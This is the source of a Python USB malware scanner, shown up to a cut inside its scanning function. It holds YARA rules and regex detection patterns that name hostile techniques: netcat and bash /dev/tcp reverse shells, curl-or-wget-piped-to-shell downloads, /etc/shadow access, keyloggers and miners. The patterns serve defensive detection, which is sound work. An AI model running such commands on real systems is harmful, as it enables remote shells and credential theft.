#!/usr/bin/env python3
"""
Praxion 0.1 - Common USB Malware Scanner & Cleaner
Copyright (c) 2025 praveen k
this program is the free software : you can redistribute it and / or modify it under the MIT LICENSE

Features:
- Enhanced YARA rules for common malware patterns
- Expanded fallback heuristics with additional suspicious patterns
- Improved PE analysis with more suspicious API detection
- Linux ELF analysis and malware detection
- macOS Mach-O analysis and malware detection  
- Cross-platform script detection (Python, Node.js, etc.)
- Safe quarantine copy with evidence JSON
- ssdeep hashing
- PE quick-check (pefile) heuristic
- Bounded parallel scanning (ThreadPoolExecutor)
- Optional event-driven scanning with watchdog + debounce
- Optional VirusTotal API integration
"""

import argparse
import os
import sys
import time
import shutil
import hashlib
import json
import subprocess
import threading
import re
import tempfile
import warnings
from datetime import datetime
import platform
import stat
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

# Suppress deprecation warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

# ---------------- CLI flags (argparse) ----------------
parser = argparse.ArgumentParser(description="Praxion USB Malware Scanner")
parser.add_argument("--mode", choices=["run", "test", "debug", "auto-delete"], default="run",
                    help="Operation mode: 'run' (default), 'test', 'debug', 'auto-delete'")
parser.add_argument("--test", action="store_true", help="(legacy) create test samples and scan them")
parser.add_argument("--debug", action="store_true", help="(legacy) enable debug logging")
parser.add_argument("--auto-delete-original", action="store_true", help="(legacy) delete original after quarantine")
parser.add_argument("--poll-interval", type=int, default=None, help="Override default poll interval (seconds)")
parser.add_argument("--virustotal", action="store_true", help="Enable VirusTotal API scanning for suspicious files")
parser.add_argument("--vt-api-key", type=str, default="", help="VirusTotal API key (or set VIRUSTOTAL_API_KEY env var)")
parser.add_argument("--vt-scan-timeout", type=int, default=30, help="VirusTotal API timeout in seconds (default: 30)")
args = parser.parse_args()

RUN_TEST_MODE = args.test or (args.mode == "test")
DEBUG_MODE = args.debug or (args.mode == "debug")
AUTO_DELETE_ORIGINAL = args.auto_delete_original or (args.mode == "auto-delete")
VIRUSTOTAL_ENABLED = args.virustotal
VIRUSTOTAL_API_KEY = args.vt_api_key or os.getenv("VIRUSTOTAL_API_KEY", "")
VIRUSTOTAL_TIMEOUT = args.vt_scan_timeout

# ---------------- Configuration ----------------
POLL_INTERVAL = 2  # seconds (fallback)
if args.poll_interval is not None:
    try:
        POLL_INTERVAL = max(1, int(args.poll_interval))
    except Exception:
        pass

BASE_DIR = os.path.abspath(os.path.dirname(__file__))
LOG_DIR = os.path.join(BASE_DIR, "logs")
LOG_FILE = os.path.join(LOG_DIR, "scan_log.txt")
DEBUG_LOG_FILE = os.path.join(LOG_DIR, "scan_debug.txt")
QUARANTINE_DIR = os.path.join(BASE_DIR, "suspicious")

# Enhanced file extension targets
YARA_TARGET_EXTS = {
    ".exe", ".dll", ".lnk", ".inf", ".ps1", ".vbs", ".js", 
    ".doc", ".docm", ".xlsm", ".xlsx", ".pdf", ".scr", 
    ".bat", ".cmd", ".vbe", ".jar", ".hta", ".wsf", ".pptm"
}
YARA_MAX_SIZE = 50 * 1024 * 1024  # 50 MB
MAX_WORKERS = 4
STABLE_WAIT_TIMEOUT = 3.0

# Cross-platform configuration
CURRENT_PLATFORM = platform.system().lower()
if CURRENT_PLATFORM == "darwin":
    CURRENT_PLATFORM = "mac"

# ensure folders exist
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(QUARANTINE_DIR, exist_ok=True)

# ---------------- Color setup ----------------
try:
    from colorama import init as _colorama_init, Fore, Style
    _colorama_init(autoreset=True)
    COLOR_SAFE = Fore.GREEN
    COLOR_MAL = Fore.RED
    COLOR_REPORT = Fore.YELLOW
    COLOR_VT = Fore.CYAN
    COLOR_RESET = Style.RESET_ALL
except Exception:
    COLOR_SAFE = "\033[92m"
    COLOR_MAL = "\033[91m"
    COLOR_REPORT = "\033[93m"
    COLOR_VT = "\033[96m"
    COLOR_RESET = "\033[0m"

# ---------------- Logging helpers ----------------
def now_ts():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def _write_log(line, path=LOG_FILE):
    try:
        with open(path, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except Exception:
        pass

def log(status, msg, *, console=True):
    line = f"[{now_ts()}] {status} {msg}"
    _write_log(line, LOG_FILE)
    if console:
        print(line)
    if DEBUG_MODE:
        _write_log(line, DEBUG_LOG_FILE)

def info(msg): log("[i]", msg)
def ok(msg): log("[+]", msg)
def star(msg): log("[*]", msg)
def warn_cmd(msg): log("[WARN_CMD]", msg)
def warn(msg): log("[WARNING]", msg)

# ---------------- History & threat logs ----------------
HISTORY_LOG = os.path.join(LOG_DIR, "scan_history.txt")
THREAT_LOG = os.path.join(LOG_DIR, "threat_explanations.txt")

def log_history(file_path, status):
    try:
        with open(HISTORY_LOG, "a", encoding="utf-8") as f:
            f.write(f"{now_ts()} | {file_path} | {status}\n")
    except Exception:
        pass

def log_threat(file_path, explanation):
    try:
        with open(THREAT_LOG, "a", encoding="utf-8") as f:
            f.write(f"{now_ts()} | {file_path} | {explanation}\n")
    except Exception:
        pass

# ---------------- Auto-install helper ----------------
def pip_install(pkg):
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "--user", pkg],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=300)
        return True
    except Exception:
        return False

# ---------------- Optional deps ----------------
YARA_AVAILABLE = False
PSUTIL_AVAILABLE = False
VIRUSTOTAL_AVAILABLE = False
yara = None
compiled_rules = None

def ensure_dependencies():
    global YARA_AVAILABLE, PSUTIL_AVAILABLE, VIRUSTOTAL_AVAILABLE, yara
    try:
        import psutil as _ps
        PSUTIL_AVAILABLE = True
    except Exception:
        PSUTIL_AVAILABLE = False
        if pip_install("psutil"):
            try:
                import psutil as _ps
                PSUTIL_AVAILABLE = True
            except Exception:
                PSUTIL_AVAILABLE = False
    try:
        import yara as _y
        yara = _y
        YARA_AVAILABLE = True
    except Exception:
        YARA_AVAILABLE = False
        if pip_install("yara-python"):
            try:
                import yara as _y
                yara = _y
                YARA_AVAILABLE = True
            except Exception:
                YARA_AVAILABLE = False
    # Check for VirusTotal API
    try:
        import vt
        VIRUSTOTAL_AVAILABLE = True
    except Exception:
        VIRUSTOTAL_AVAILABLE = False
        if VIRUSTOTAL_ENABLED:
            if pip_install("vt-py"):
                try:
                    import vt
                    VIRUSTOTAL_AVAILABLE = True
                except Exception:
                    VIRUSTOTAL_AVAILABLE = False

try:
    import pefile
    PEFILE_AVAILABLE = True
except Exception:
    PEFILE_AVAILABLE = False

try:
    import ssdeep
    SSDEEP_AVAILABLE = True
except Exception:
    SSDEEP_AVAILABLE = False

try:
    from watchdog.observers import Observer
    from watchdog.events import FileSystemEventHandler
    WATCHDOG_AVAILABLE = True
except Exception:
    WATCHDOG_AVAILABLE = False

# ==================== LINUX MALWARE DETECTION ====================

def elf_quick_check(path):
    """Enhanced ELF file analysis for Linux"""
    if not os.path.exists(path):
        return None
    
    try:
        with open(path, "rb") as f:
            header = f.read(4)
            if header != b'\x7fELF':
                return None
    except:
        return None
    
    suspicious = {
        "suspicious_imports": [],
        "suspicious_sections": [],
        "packer_indicators": [],
        "analysis": {}
    }
    
    try:
        # Basic ELF structure analysis
        with open(path, "rb") as f:
            data = f.read(4096)  # Read first 4KB for analysis
            
        # Check for UPX packing
        if b'UPX!' in data:
            suspicious["packer_indicators"].append("UPX_packed")
            
        # Check for common malware behaviors in strings
        text = data.decode('latin-1', errors='ignore').lower()
        
        # Linux-specific suspicious patterns
        linux_malware_indicators = [
            # System manipulation
            (r"/etc/passwd", "password_file_access"),
            (r"/etc/shadow", "shadow_file_access"),
            (r"/etc/ld\.so\.preload", "ld_preload_hijack"),
            (r"ptrace", "debugger_evasion"),
            (r"inotify", "file_monitoring"),
            (r"netlink", "kernel_communication"),
            
            # Persistence mechanisms
            (r"/etc/rc\.local", "rc_local_persistence"),
            (r"/etc/cron\.", "cron_persistence"),
            (r"/etc/systemd/", "systemd_persistence"),
            (r"~/.bashrc", "bashrc_persistence"),
            (r"~/.profile", "profile_persistence"),
            
            # Network suspicious activities
            (r"raw_socket", "raw_socket_access"),
            (r"packet_socket", "packet_sniffing"),
            
            # Cryptomining
            (r"stratum\+tcp", "cryptomining_pool"),
            (r"xmrig", "xmrig_miner"),
            (r"cpuminer", "cpu_miner"),
            
            # Keylogging (Linux)
            (r"x11", "x11_keylogging"),
            (r"xinput", "xinput_keylogging"),
            (r"evdev", "evdev_keylogging"),
        ]
        
        for pattern, description in linux_malware_indicators:
            if re.search(pattern, text, re.IGNORECASE):
                suspicious["suspicious_imports"].append(description)
                
    except Exception as e:
        suspicious["analysis"]["error"] = str(e)
    
    return suspicious if suspicious["suspicious_imports"] or suspicious["packer_indicators"] else None

def analyze_linux_script(path):
    """Analyze Linux shell scripts for malicious content"""
    try:
        with open(path, "r", encoding='utf-8', errors='ignore') as f:
            content = f.read().lower()
    except:
        return None
    
    suspicious = []
    
    linux_script_patterns = [
        # Dangerous commands with obfuscation
        (r"curl.*\|.*sh", "curl_pipe_shell"),
        (r"wget.*\|.*sh", "wget_pipe_shell"),
        (r"base64.*-d.*\|.*sh", "base64_decode_shell"),
        
        # System modification
        (r"chmod.*[67][67][67]", "suspicious_permissions"),
        (r"chattr.*\+i", "immutable_flag_set"),
        (r"setuid", "setuid_bit_manipulation"),
        
        # Network suspicious
        (r"nc.*-e.*/bin/sh", "netcat_reverse_shell"),
        (r"bash.*-i.*>&.*/dev/tcp", "bash_reverse_shell"),
        (r"ssh.*-o.*StrictHostKeyChecking=no", "ssh_key_checking_disabled"),
        
        # Cryptomining in scripts
        (r"minerd", "cpu_miner"),
        (r"cgminer", "gpu_miner"),
        (r"pool.*stratum", "mining_pool"),
        
        # Download and execute
        (r"wget.*-O.*/tmp/", "download_to_tmp"),
        (r"curl.*-o.*/tmp/", "curl_download_to_tmp"),
    ]
    
    for pattern, description in linux_script_patterns:
        if re.search(pattern, content, re.IGNORECASE):
            suspicious.append(description)
    
    return suspicious if suspicious else None

# ==================== MAC MALWARE DETECTION ====================

def macho_quick_check(path):
    """Enhanced Mach-O file analysis for macOS"""
    if not os.path.exists(path):
        return None
    
    try:
        with open(path, "rb") as f:
            magic = f.read(4)
            # Mach-O magic numbers
            if magic not in [b'\xfe\xed\xfa\xce', b'\xfe\xed\xfa\xcf', 
                           b'\xce\xfa\xed\xfe', b'\xcf\xfa\xed\xfe']:
                return None
    except:
        return None
    
    suspicious = {
        "suspicious_imports": [],
        "suspicious_frameworks": [],
        "analysis": {}
    }
    
    try:
        with open(path, "rb") as f:
            data = f.read(8192)  # Read more for string analysis
            
        text = data.decode('latin-1', errors='ignore').lower()
        
        # macOS-specific suspicious patterns
        mac_malware_indicators = [
            # Persistence mechanisms
            (r"launchd", "launchd_persistence"),
            (r"launchctl", "launchctl_command"),
            (r"/Library/LaunchDaemons", "launch_daemon"),
            (r"/Library/LaunchAgents", "launch_agent"),
            (r"~/Library/LaunchAgents", "user_launch_agent"),
            
            # Suspicious frameworks
            (r"CoreServices", "core_services_access"),
            (r"Security", "security_framework"),
            (r"AuthorizationExecuteWithPrivileges", "privilege_escalation"),
            
            # Keylogging (macOS)
            (r"CGEventTapCreate", "event_tap_keylogging"),
            (r"NSEvent", "ns_event_monitoring"),
            (r"IOKit", "iokit_access"),
            
            # Cryptomining
            (r"stratum", "mining_pool"),
            (r"xmrig", "xmrig_miner"),
            
            # Network suspicious
            (r"CFSocket", "socket_creation"),
            (r"NSConnection", "network_connection"),
        ]
        
        for pattern, description in mac_malware_indicators:
            if re.search(pattern, text, re.IGNORECASE):
                suspicious["suspicious_imports"].append(description)
                
    except Exception as e:
        suspicious["analysis"]["error"] = str(e)
    
    return suspicious if suspicious["suspicious_imports"] else None

def analyze_mac_script(path):
    """Analyze macOS scripts (AppleScript, shell) for malicious content"""
    try:
        with open(path, "r", encoding='utf-8', errors='ignore') as f:
            content = f.read().lower()
    except:
        return None
    
    suspicious = []
    
    mac_script_patterns = [
        # AppleScript suspicious patterns
        (r"do shell script", "apple_shell_script"),
        (r"administrator privileges", "apple_script_privileges"),
        (r"with administrator privileges", "admin_privileges_request"),
        
        # macOS-specific persistence
        (r"launchctl load", "launchctl_persistence"),
        (r"defaults write", "defaults_persistence"),
        (r"login item", "login_item_persistence"),
        
        # File system manipulation
        (r"chmod.*\+x", "make_executable"),
        (r"chflags hidden", "hide_files"),
        
        # Network suspicious
        (r"curl.*bash", "curl_to_bash"),
        (r"wget.*sh", "wget_to_shell"),
    ]
    
    for pattern, description in mac_script_patterns:
        if re.search(pattern, content, re.IGNORECASE):
            suspicious.append(description)
    
    return suspicious if suspicious else None

# ==================== CROSS-PLATFORM SCRIPT DETECTION ====================

def analyze_cross_platform_scripts(path):
    """Analyze cross-platform scripts (Python, Node.js, etc.)"""
    ext = os.path.splitext(path)[1].lower()
    
    try:
        with open(path, "r", encoding='utf-8', errors='ignore') as f:
            content = f.read().lower()
    except:
        return None
    
    suspicious = []
    
    # Python malware patterns
    python_patterns = [
        (r"import os.*subprocess", "subprocess_import"),
        (r"exec\(.*compile", "dynamic_code_execution"),
        (r"__import__\(", "dynamic_import"),
        (r"keyboard.*hook", "python_keylogger"),
        (r"pynput", "pynput_keylogger"),
        (r"requests.*post", "data_exfiltration"),
        (r"urllib.*urlopen", "network_communication"),
        (r"base64.*b64decode", "base64_obfuscation"),
        (r"eval\(.*base64", "eval_base64_obfuscation"),
        (r"ctypes.*windll", "ctypes_windows_api"),
        (r"ctypes.*cdll", "ctypes_library_load"),
    ]
    
    # Node.js malware patterns
    nodejs_patterns = [
        (r"require\(['\"]child_process['\"]", "child_process_require"),
        (r"execSync", "synchronous_execution"),
        (r"spawnSync", "process_spawning"),
        (r"keylogger", "keylogger_mention"),
        (r"require\(['\"]os['\"]", "os_module"),
        (r"process\.env", "environment_access"),
        (r"fs\.writeFile", "file_system_write"),
        (r"http\.request", "http_requests"),
        (r"net\.connect", "network_connection"),
    ]
    
    # Generic script patterns
    generic_patterns = [
        (r"base64.*decode", "base64_decoding"),
        (r"eval\(.*atob", "javascript_eval_base64"),
        (r"Function\(.*\)", "javascript_dynamic_function"),
        (r"powershell.*-encodedcommand", "powershell_encoded"),
        (r"python.*-c", "python_command_line"),
        (r"node.*-e", "nodejs_command_line"),
    ]
    
    if ext == '.py':
        for pattern, description in python_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                suspicious.append(f"python_{description}")
    
    elif ext in ['.js', '.node']:
        for pattern, description in nodejs_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                suspicious.append(f"nodejs_{description}")
    
    # Check generic patterns for all script types
    for pattern, description in generic_patterns:
        if re.search(pattern, content, re.IGNORECASE):
            suspicious.append(f"generic_{description}")
    
    return suspicious if suspicious else None

# ---------------- VirusTotal API Integration ----------------
def virustotal_scan_file(file_path, api_key, timeout=30):
    """
    Scan a file with VirusTotal API
    Returns: (success, result_dict, error_message)
    """
    if not VIRUSTOTAL_AVAILABLE:
        return False, None, "vt-py package not available"
    
    if not api_key:
        return False, None, "VirusTotal API key not provided"
    
    try:
        import vt
        
        # Check file size limit (VirusTotal has 32MB limit for public API, 200MB for premium)
        file_size = os.path.getsize(file_path)
        if file_size > 32 * 1024 * 1024:  # 32MB
            return False, None, f"File too large for VirusTotal ({file_size} bytes)"
        
        client = vt.Client(api_key)
        
        # Upload file for analysis
        with open(file_path, "rb") as f:
            analysis = client.scan_file(f, wait_for_completion=True, timeout=timeout)
        
        # Get analysis results
        result = {
            "id": analysis.id,
            "status": analysis.status,
            "stats": analysis.stats if hasattr(analysis, 'stats') else {},
            "results": {}
        }
        
        # Get detailed results if available
        if hasattr(analysis, 'results'):
            result["results"] = analysis.results
        
        client.close()
        return True, result, None
        
    except Exception as e:
        return False, None, f"VirusTotal scan failed: {e}"

def virustotal_check_hash(file_hash, api_key, timeout=30):
    """
    Check file hash with VirusTotal API
    Returns: (success, result_dict, error_message)
    """
    if not VIRUSTOTAL_AVAILABLE:
        return False, None, "vt-py package not available"
    
    if not api_key:
        return False, None, "VirusTotal API key not provided"
    
    try:
        import vt
        
        client = vt.Client(api_key)
        
        # Try to get file report by hash
        file_object = client.get_object(f"/files/{file_hash}")
        
        result = {
            "md5": getattr(file_object, 'md5', None),
            "sha1": getattr(file_object, 'sha1', None),
            "sha256": getattr(file_object, 'sha256', None),
            "last_analysis_stats": getattr(file_object, 'last_analysis_stats', {}),
            "last_analysis_results": getattr(file_object, 'last_analysis_results', {}),
            "reputation": getattr(file_object, 'reputation', None),
            "popular_threat_classification": getattr(file_object, 'popular_threat_classification', {}),
            "meaningful_name": getattr(file_object, 'meaningful_name', None)
        }
        
        client.close()
        return True, result, None
        
    except Exception as e:
        if "NotFoundError" in str(e):
            return False, None, "File not found in VirusTotal database"
        return False, None, f"VirusTotal hash check failed: {e}"

# ---------------- Enhanced YARA rules ----------------
BUILTIN_YARA_RULES = r'''
rule USB_Autorun_INF { 
    meta: 
        info = "autorun.inf-like content"
        severity = "high"
    strings: 
        $autorun = "open=" nocase
        $shell = "shellexecute=" nocase
        $action = "action=" nocase
    condition: 
        filesize < 64KB and any of them 
}

rule USB_Shortcut { 
    meta: 
        info = "Suspicious LNK shortcut"
        severity = "high"
    strings: 
        $lnk_magic = {4C 00 00 00}
        $cmd = "cmd.exe" ascii nocase
        $powershell = "powershell" ascii nocase
        $wscript = "wscript" ascii nocase
        $cscript = "cscript" ascii nocase
    condition: 
        filesize < 256KB and $lnk_magic at 0 and any of ($cmd, $powershell, $wscript, $cscript)
}

rule Suspicious_Executable_Names {
    meta: 
        info = "Common malware executable names in wrong location"
        severity = "medium"
    strings:
        $name1 = "svchost.exe" nocase
        $name2 = "csrss.exe" nocase
        $name3 = "lsass.exe" nocase
        $name4 = "system32.exe" nocase
        $name5 = "smss.exe" nocase
        $name6 = "winlogon.exe" nocase
    condition:
        uint16(0) == 0x5A4D and any of them
}

rule Ransomware_Extensions {
    meta: 
        info = "Common ransomware file extensions"
        severity = "critical"
    strings:
        $ext1 = ".locked" nocase
        $ext2 = ".encrypted" nocase
        $ext3 = ".crypt" nocase
        $ext4 = ".cerber" nocase
        $ext5 = ".locky" nocase
        $ext6 = ".zepto" nocase
        $ext7 = ".osiris" nocase
        $ext8 = ".wcry" nocase
        $ext9 = ".wncry" nocase
        $ext10 = ".crypto" nocase
    condition:
        any of them
}

rule Office_Macro_Suspicious {
    meta: 
        info = "Office file with suspicious macro indicators"
        severity = "high"
    strings:
        $autoopen1 = "AutoOpen" nocase
        $autoopen2 = "Workbook_Open" nocase
        $autoopen3 = "Document_Open" nocase
        $shell = "WScript.Shell" nocase
        $createobj = "CreateObject" nocase
        $downloadfile = "URLDownloadToFile" nocase
        $powersh = "powershell" nocase
        $exec = "Shell(" nocase
        $magic_doc = {D0 CF 11 E0}
        $magic_zip = {50 4B 03 04}
    condition:
        ($magic_doc at 0 or $magic_zip at 0) and
        (any of ($autoopen*)) and (any of ($shell, $createobj, $downloadfile, $powersh, $exec))
}

rule Cryptocurrency_Miner {
    meta: 
        info = "Potential cryptocurrency miner"
        severity = "medium"
    strings:
        $s1 = "stratum+tcp://" ascii
        $s2 = "xmrig" nocase
        $s3 = "cryptonight" nocase
        $s4 = "monero" nocase
        $s5 = "NiceHash" nocase
        $s6 = "minergate" nocase
        $s7 = "pool.supportxmr" nocase
        $s8 = "nanopool" nocase
    condition:
        2 of them
}

rule Packed_Executable {
    meta: 
        info = "Possibly packed executable"
        severity = "medium"
    strings:
        $upx = "UPX!" ascii
        $aspack = "aPLib" ascii
        $petite = "petite" nocase
        $fsg = ".FSG" ascii
        $mew = "MEW" ascii
    condition:
        uint16(0) == 0x5A4D and any of them
}

rule Keylogger_Indicators {
    meta:
        info = "Potential keylogger indicators"
        severity = "high"
    strings:
        $api1 = "GetAsyncKeyState" ascii
        $api2 = "SetWindowsHookEx" ascii
        $api3 = "GetForegroundWindow" ascii
        $api4 = "GetWindowText" ascii
    condition:
        uint16(0) == 0x5A4D and 2 of them
}

rule Network_Download {
    meta:
        info = "Potential downloader"
        severity = "high"
    strings:
        $net1 = "URLDownloadToFile" ascii nocase
        $net2 = "InternetOpen" ascii
        $net3 = "InternetReadFile" ascii
        $net4 = "HttpSendRequest" ascii
        $net5 = "WinHttpOpen" ascii
    condition:
        uint16(0) == 0x5A4D and 2 of them
}

rule Persistence_Registry {
    meta:
        info = "Registry persistence mechanism"
        severity = "high"
    strings:
        $reg1 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" nocase
        $reg2 = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" nocase
        $api1 = "RegSetValueEx" ascii
        $api2 = "RegCreateKeyEx" ascii
    condition:
        any of ($reg*) and any of ($api*)
}

rule Double_Extension {
    meta:
        info = "Suspicious double extension"
        severity = "high"
    strings:
        $ext1 = ".pdf.exe" nocase
        $ext2 = ".jpg.exe" nocase
        $ext3 = ".png.exe" nocase
        $ext4 = ".doc.exe" nocase
        $ext5 = ".txt.exe" nocase
        $ext6 = ".zip.exe" nocase
        $ext7 = ".pdf.scr" nocase
        $ext8 = ".jpg.scr" nocase
        $ext9 = ".doc.bat" nocase
        $ext10 = ".txt.cmd" nocase
    condition:
        any of them
}
'''

def load_builtin_rules():
    global compiled_rules
    if YARA_AVAILABLE:
        try:
            compiled_rules = yara.compile(source=BUILTIN_YARA_RULES)
        except Exception as e:
            info(f"Failed to compile YARA rules: {e}")
            compiled_rules = None
    else:
        compiled_rules = None

# ---------------- Enhanced fallback heuristics ----------------
FALLBACK_CONTENT_REGEX = [
    # Process injection
    re.compile(b"CreateRemoteThread", re.IGNORECASE),
    re.compile(b"VirtualAllocEx", re.IGNORECASE),
    re.compile(b"WriteProcessMemory", re.IGNORECASE),
    re.compile(b"NtQuerySystemInformation", re.IGNORECASE),
    re.compile(b"ZwQuerySystemInformation", re.IGNORECASE),
    
    # Keylogger APIs
    re.compile(b"GetAsyncKeyState", re.IGNORECASE),
    re.compile(b"SetWindowsHookEx", re.IGNORECASE),
    
    # Network/Download
    re.compile(b"URLDownloadToFile", re.IGNORECASE),
    re.compile(b"InternetOpen", re.IGNORECASE),
    re.compile(b"HttpSendRequest", re.IGNORECASE),
    re.compile(b"WinHttpOpen", re.IGNORECASE),
    
    # Registry persistence
    re.compile(b"RegSetValue", re.IGNORECASE),
    re.compile(b"RegCreateKey", re.IGNORECASE),
    re.compile(b"CurrentVersion\\\\Run", re.IGNORECASE),
    
    # Process manipulation
    re.compile(b"OpenProcess", re.IGNORECASE),
    re.compile(b"TerminateProcess", re.IGNORECASE),
    re.compile(b"CreateToolhelp32Snapshot", re.IGNORECASE),
    
    # Crypto/Ransomware
    re.compile(b"CryptEncrypt", re.IGNORECASE),
    re.compile(b"CryptDecrypt", re.IGNORECASE),
    re.compile(b"CryptAcquireContext", re.IGNORECASE),
    
    # Anti-debug
    re.compile(b"IsDebuggerPresent", re.IGNORECASE),
    re.compile(b"CheckRemoteDebuggerPresent", re.IGNORECASE),
]

FALLBACK_NAME_PATTERNS = [
    # Autorun
    re.compile(r"\bautorun\b", re.IGNORECASE),
    re.compile(r"\.lnk$", re.IGNORECASE),
    
    # Double extensions
    re.compile(r"\.(pdf|jpg|png|doc|txt|zip)\.(exe|scr|com|pif|bat|cmd)$", re.IGNORECASE),
    
    # Suspicious system names (not in system32)
    re.compile(r"^(svchost|csrss|lsass|smss|winlogon|system32)\.exe$", re.IGNORECASE),
    
    # Hidden executables
    re.compile(r"^\._.*\.exe$", re.IGNORECASE),
    
    # Common malware names on USB root
    re.compile(r"^(update|setup|install|crack|keygen|patch)\.exe$", re.IGNORECASE),
]

def builtin_scan(path):
    matches = []
    name = os.path.basename(path)
    ext = os.path.splitext(name)[1].lower()
    
    # Platform-specific analysis
    if CURRENT_PLATFORM == "linux":
        # ELF analysis
        elf_result = elf_quick_check(path)
        if elf_result:
            matches.append({"type": "elf_analysis", "pattern": elf_result})
        
        # Linux script analysis
        if ext in ['.sh', '.bash', '.zsh']:
            script_result = analyze_linux_script(path)
            if script_result:
                matches.append({"type": "linux_script", "pattern": script_result})
    
    elif CURRENT_PLATFORM == "mac":
        # Mach-O analysis
        macho_result = macho_quick_check(path)
        if macho_result:
            matches.append({"type": "macho_analysis", "pattern": macho_result})
        
        # macOS script analysis
        if ext in ['.sh', '.bash', '.zsh', '.scpt', '.applescript']:
            script_result = analyze_mac_script(path)
            if script_result:
                matches.append({"type": "mac_script", "pattern": script_result})
    
    # Cross-platform script analysis (runs on all platforms)
    if ext in ['.py', '.js', '.node', '.rb', '.pl', '.php']:
        script_result = analyze_cross_platform_scripts(path)
        if script_result:
            matches.append({"type": "cross_platform_script", "pattern": script_result})
    
    # Enhanced filename checks
    filename_checks = [
        (re.compile(r"(?i:^autorun\.inf$)"), "autorun_filename"),
        (re.compile(r"(?i:\.lnk$)"), "shortcut_filename"),
        (re.compile(r"(?i:\.scr$)"), "screensaver"),
        (re.compile(r"(?i:\.ps1$)"), "powershell"),
        (re.compile(r"(?i:\.docm$|\.xlsm$|\.pptm$)"), "office_macro_file"),
        (re.compile(r"(?i:\.bat$|\.cmd$)"), "batch_file"),
        (re.compile(r"(?i:\.vbe$|\.vbs$)"), "vbscript_file"),
        (re.compile(r"(?i:\.hta$)"), "html_application"),
        (re.compile(r"(?i:\.wsf$)"), "windows_script_file"),
        (re.compile(r"(?i:\.(pdf|jpg|png|doc|txt|zip)\.(exe|scr|com|pif|bat|cmd)$)"), "double_extension"),
        (re.compile(r"(?i:^(svchost|csrss|lsass|smss|winlogon|system32)\.exe$)"), "fake_system_process"),
        (re.compile(r"(?i:^(update|setup|install|crack|keygen|patch)\.exe$)"), "suspicious_installer"),
    ]
    
    for patt, tag in filename_checks:
        try:
            if patt.search(name):
                matches.append({"type": "filename", "pattern": tag})
        except Exception:
            pass

    # Read file head for content analysis
    HEAD_READ = 1024 * 1024  # 1 MB
    data = b""
    try:
        size = os.path.getsize(path)
        with open(path, "rb") as fh:
            data = fh.read(min(HEAD_READ, max(8192, size)))
    except Exception:
        data = b""

    try:
        text = data.decode("latin-1", errors="ignore")
        text_lower = text.lower()
    except Exception:
        text = ""
        text_lower = ""

    # Enhanced content checks
    content_checks = [
        (re.compile(r"createremotethread", re.IGNORECASE), "CreateRemoteThread"),
        (re.compile(r"virtualallocex", re.IGNORECASE), "VirtualAllocEx"),
        (re.compile(r"writeprocessmemory", re.IGNORECASE), "WriteProcessMemory"),
        (re.compile(r"getasynckeystate", re.IGNORECASE), "GetAsyncKeyState_Keylogger"),
        (re.compile(r"setwindowshookex", re.IGNORECASE), "SetWindowsHookEx_Keylogger"),
        (re.compile(r"urldownloadtofile", re.IGNORECASE), "URLDownloadToFile_Downloader"),
        (re.compile(r"internetopen|internetreadfile", re.IGNORECASE), "Internet_APIs"),
        (re.compile(r"regsetvalue|regcreatekey", re.IGNORECASE), "Registry_Modification"),
        (re.compile(r"currentversion\\\\run", re.IGNORECASE), "Startup_Persistence"),
        (re.compile(r"cryptencrypt|cryptdecrypt", re.IGNORECASE), "Crypto_APIs_Ransomware"),
        (re.compile(r"isdebuggerpresent|checkremotedebugger", re.IGNORECASE), "Anti_Debug"),
        (re.compile(r"-encodedcommand\s+[a-z0-9+/=]{40,}", re.IGNORECASE), "PS_EncodedCommand"),
        (re.compile(r"invoke-expression|iex\s*\(", re.IGNORECASE), "Invoke-Expression"),
        (re.compile(r"adodb\.stream", re.IGNORECASE), "ADODB.Stream"),
        (re.compile(r"wscript\.shell", re.IGNORECASE), "WScript.Shell"),
        (re.compile(r"createobject\(|getobject\(", re.IGNORECASE), "VBA_CreateObject"),
        (re.compile(r"autoopen|workbook_open|document_open", re.IGNORECASE), "Office_AutoOpen"),
        (re.compile(r"[A-Za-z0-9+/]{60,}={0,2}"), "LargeBase64Blob"),
    ]
    
    for patt, tag in content_checks:
        try:
            if patt.search(text):
                matches.append({"type": "content", "pattern": tag})
        except Exception:
            pass

    # LNK analysis
    if ext == ".lnk" or (len(data) >= 4 and data[:4] == b"\x4C\x00\x00\x00"):
        for s in (b"cmd.exe", b"powershell.exe", b"cscript.exe", b"wscript.exe", b"mshta.exe"):
            try:
                if s in data or s.decode().lower() in text_lower:
                    matches.append({"type": "lnk", "pattern": s.decode()})
            except Exception:
                pass
        if b"\\" in data or "\\" in text:
            matches.append({"type": "lnk", "pattern": "UNC_Path"})

    # PE analysis
    if len(data) >= 2 and data[:2] == b"MZ":
        pe_sigs = [
            b"CreateRemoteThread", b"VirtualAllocEx", b"WriteProcessMemory", 
            b"LoadLibraryA", b"GetProcAddress", b"GetAsyncKeyState",
            b"SetWindowsHookEx", b"URLDownloadToFile", b"RegSetValueEx",
            b"IsDebuggerPresent", b"CheckRemoteDebuggerPresent"
        ]
        for sig in pe_sigs:
            if sig in data:
                matches.append({"type": "pe", "pattern": sig.decode(errors="ignore")})

    # Office macro detection
    if ext in (".docm", ".xlsm", ".doc", ".xls", ".ppt", ".pptx", ".pptm"):
        if re.search(r"autoopen|workbook_open|document_open|createobject\(", text, re.IGNORECASE):
            matches.append({"type": "office", "pattern": "macro_autoopen"})

    # Script detection
    if ext in (".ps1", ".js", ".vbs", ".bat", ".cmd") or "powershell" in text_lower or "-encodedcommand" in text_lower:
        if re.search(r"-EncodedCommand\s+[A-Za-z0-9+/=]{40,}", text):
            matches.append({"type": "powershell", "pattern": "encoded_command"})
        if re.search(r"invoke-expression|iex\s*\(", text, re.IGNORECASE):
            matches.append({"type": "powershell", "pattern": "invoke_expression"})
        if re.search(r"wscript\.shell|createobject|adodb\.stream", text, re.IGNORECASE):
            matches.append({"type": "script", "pattern": "dropper_behavior"})

    # Deduplicate
    seen = set()
    uniq = []
    for m in matches:
